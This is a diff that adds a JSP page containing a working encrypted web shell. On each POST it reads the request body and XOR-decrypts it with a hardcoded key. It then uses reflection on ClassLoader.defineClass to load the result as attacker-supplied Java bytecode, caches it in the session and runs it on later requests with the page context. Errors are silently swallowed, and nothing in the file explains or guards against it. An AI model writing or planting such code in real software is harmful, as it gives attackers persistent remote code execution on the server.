@@ -1,0 +1,66 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"
+          xmlns:c="http://java.sun.com/jsp/jstl/core">
+    <jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" />
+    <jsp:directive.page import="java.util.*,java.io.*,java.lang.reflect.*" />
+
+    <jsp:declaration>
+    <![CDATA[
+    private byte[] decryptPayload(byte[] abData, String szKeyStr) {
+        if (abData == null || abData.length == 0 || szKeyStr == null) {
+            return new byte[0];
+        }
+        
+        byte[] abDecrypted = new byte[abData.length];
+        byte[] abKeyBytes = szKeyStr.getBytes();
+        int nKeyLength = abKeyBytes.length;
+        
+        for (int nI = 0; nI < abData.length; nI++)
+            abDecrypted[nI] = (byte) (abData[nI] ^ abKeyBytes[(nI + 1) % nKeyLength]);
+        
+        return abDecrypted;
+    }
+    ]]>
+    </jsp:declaration>
+
+    <jsp:scriptlet>
+    <![CDATA[
+    if (request.getMethod().equals("POST")) {
+        Object objLoader = session.getAttribute("pulsar_loader");
+        
+        if (objLoader == null) {
+            ByteArrayOutputStream bosBuffer = new ByteArrayOutputStream();
+            byte[] abChunk = new byte[512];
+            int nLength = request.getInputStream().read(abChunk);
+            while (nLength > 0) { 
+                bosBuffer.write(abChunk, 0, nLength); 
+                nLength = request.getInputStream().read(abChunk); 
+            }
+            byte[] abEncryptedData = bosBuffer.toByteArray();
+            
+            String szKey = "[NBPULSARDEADBEEF]";
+            byte[] abData = decryptPayload(abEncryptedData, szKey);
+            
+            try {
+                ClassLoader objParentLoader = this.getClass().getClassLoader();
+                ClassLoader objSandboxLoader = new ClassLoader(objParentLoader) {};
+                
+                Method fnDefineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                fnDefineMethod.setAccessible(true);
+                
+                Class<?> clazzTarget = (Class<?>) fnDefineMethod.invoke(objSandboxLoader, abData, 0, abData.length);
+                
+                Constructor<?> objConstructor = clazzTarget.getConstructor(ClassLoader.class);
+                objLoader = objConstructor.newInstance(objSandboxLoader);
+                
+                session.setAttribute("pulsar_loader", objLoader);
+                session.setAttribute("k", szKey);
+            } catch (Exception exRuntime) {}
+        } else {
+            try {
+                objLoader.getClass().getMethod("equals", Object.class).invoke(objLoader, pageContext);
+            } catch (Exception exRuntime) {}
+        }
+    }
+    ]]>
+    </jsp:scriptlet>
+</jsp:root>
